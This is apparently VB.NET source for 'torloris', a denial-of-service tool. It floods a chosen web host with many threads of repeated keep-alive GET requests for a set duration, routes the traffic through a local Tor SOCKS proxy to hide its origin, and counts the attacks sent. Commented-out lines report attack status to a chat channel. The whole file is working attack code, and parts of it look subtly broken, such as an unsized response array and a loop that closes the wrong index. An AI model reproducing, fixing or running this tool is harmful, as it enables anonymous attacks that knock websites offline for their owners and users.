
Imports System.Threading

Imports System.Net

Imports com.LandonKey.SocksWebProxy


Public Module torloris

    Private ThreadsEnded = 0
    Private PostDATA As String
    Private HostToAttack As String = "http://"
    Private TimetoAttack As Integer
    Private Ports As Integer
    Private ThreadstoUse As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private Attacks As Integer = 0
    Public Sub Starttorloris(ByVal Host As String, ByVal Port As Integer, ByVal Threadsto As Integer, ByVal Time As Integer, ByVal data As String)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack += Host
            Ports = Port
            PostDATA = data
            ThreadstoUse = Threadsto
            TimetoAttack = Time
            HostToAttack += "/"
            'If HostToAttack.Contains("http://") Then HostToAttack = HostToAttack.Replace("http://", String.Empty)
            'If HostToAttack.Contains("www.") Then HostToAttack = HostToAttack.Replace("www.", String.Empty)
            'If HostToAttack.Contains("/") Then HostToAttack = HostToAttack.Replace("/", String.Empty)


            Threads = New Thread(Threadsto - 1) {}
            Mainmenu.changeStatus("TorLois attack")
            For i As Integer = 0 To Threadsto - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else
            'Form1.TalktoChannel("A Torloris Attack is Already Running on " & HostToAttack)
        End If

    End Sub

    Private Sub lol()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            HostToAttack = ""
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            'Form1.TalktoChannel("Torloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & attacks.ToString)
            Attacks = 0

        End If

    End Sub

    Public Sub Stoptorloris()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            'Form1.TalktoChannel("Torloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & attacks.ToString)
            Attacks = 0
            HostToAttack = ""

        Else
            'Form1.TalktoChannel("No Torloris Attack is Running!")
        End If
    End Sub
    Public Function GenerateRandomString(ByRef len As Integer, ByRef upper As Boolean) As String
        Dim rand As New Random()
        Dim allowableChars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray()
        Dim final As String = String.Empty
        For i As Integer = 0 To len - 1
            final += allowableChars(rand.Next(allowableChars.Length - 1))
        Next

        Return IIf(upper, final.ToUpper(), final)
    End Function
    Private Sub DoWork()
        Dim file As String = ""
        Try
            Dim requestArray As HttpWebRequest
            Dim response() As HttpWebResponse
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Dim config As com.LandonKey.SocksWebProxy.Proxy.ProxyConfig = New com.LandonKey.SocksWebProxy.Proxy.ProxyConfig(IPAddress.Loopback, 8181, IPAddress.Loopback, 9150, com.LandonKey.SocksWebProxy.Proxy.ProxyConfig.SocksVersion.Five) '9150  
            Do While (stopwatch.Elapsed < span)
                Try
                    Dim i As Integer

                    For i = 0 To 100 - 1
                        If Mainmenu.Append_chchbox.Checked Then
                            file = GenerateRandomString(5, True)
                        End If
                        requestArray = CType(WebRequest.Create(HostToAttack & "/" & file), HttpWebRequest)
                        requestArray.Proxy = New SocksWebProxy(config)
                        requestArray.KeepAlive = True
                        requestArray.Method = "GET"
                        ' requestArray.ContentLength = "5235"
                        response(i) = CType(requestArray.GetResponse, HttpWebResponse)

                        'requestArray(i).Send(ASCIIEncoding.Default.GetBytes("POST / HTTP/1.1" & ChrW(13) & ChrW(10) & "Host: " & HostToAttack.ToString() & ChrW(13) & ChrW(10) & "Content-length: 5235" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)), SocketFlags.None)
                        Attacks = Attacks + 1

                    Next i
                    Dim j As Integer
                    For j = 0 To 100 - 1
                        response(i).Close()
                    Next j
                    Continue Do



                Catch

                    Continue Do
                End Try
            Loop
        Catch : End Try
        lol()
    End Sub
End Module
